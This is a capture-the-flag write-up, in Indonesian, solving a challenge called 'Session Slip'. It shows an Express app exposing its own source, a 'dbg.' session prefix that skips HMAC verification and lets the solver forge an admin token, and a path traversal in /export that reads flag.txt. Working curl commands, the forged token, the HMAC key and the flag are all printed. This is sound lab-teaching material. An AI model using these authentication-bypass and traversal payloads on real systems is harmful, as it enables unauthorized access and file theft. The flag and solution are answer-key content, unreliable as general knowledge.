# Session Slip — SOLVED

**Flag:** `athena{vYRrqCt5IjLdNyVo}`

- **Target:** `http://13.206.57.188:10028` (instance) — Express 5 "session gateway"
- **Vuln:** (1) Debug backdoor di parser session (forge session tanpa signature) →
  (2) Path traversal di `/export?file=`.

## Recon — source ke-expose
`app.use(express.static(__dirname))` bikin seluruh source ke-serve statis:
```
GET /server.js      -> full source
GET /package.json   -> express ^5.2.1
GET /sessions.json  -> fixtures (users guest/user/admin)
```

## Bug #1 — session "slip" (debug backdoor)
Session dibaca dari header **`X-Session`** (bukan cookie — makanya cookie diabaikan).
`parseSession()`:
```js
if (rawToken.startsWith('dbg.')) {
  const body = Buffer.from(rawToken.slice(4), 'base64').toString('utf8');
  return JSON.parse(body);          // <-- NO signature check!
}
const [payload, digest] = rawToken.split('.');
if (sign(payload) !== digest) return { role: 'guest' };  // normal path pakai HMAC-sha256(key='orchid')
```
Prefix `dbg.` di-trust tanpa verifikasi HMAC → bisa forge role apa aja.

Forge admin:
```bash
TOK="dbg.$(printf '%s' '{"user":"admin","role":"admin"}' | base64)"
# dbg.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==
curl -s http://13.206.57.188:10028/ -H "X-Session: $TOK"
# {"banner":"session gateway","user":"admin","role":"admin"}
```

## Bug #2 — path traversal di /export
```js
const name = req.query.file || 'admin.txt';
const target = path.join(NOTES_DIR, name);   // NOTES_DIR = .../notes
fs.readFile(target, ...)                       // ga ada sanitasi -> ../ traversal
```
`/admin` cuma kasih memo ("archived under notes/"). Flag ada di file, ketemu 2 level di atas `notes/`:

```bash
curl -s -G http://13.206.57.188:10028/export \
  --data-urlencode 'file=../../flag.txt' -H "X-Session: $TOK"
# {"file":"../../flag.txt","content":"athena{vYRrqCt5IjLdNyVo}"}
```

## Catatan
- HMAC key asli = `orchid` (juga bisa buat sign session valid, tapi backdoor `dbg.` lebih simpel).
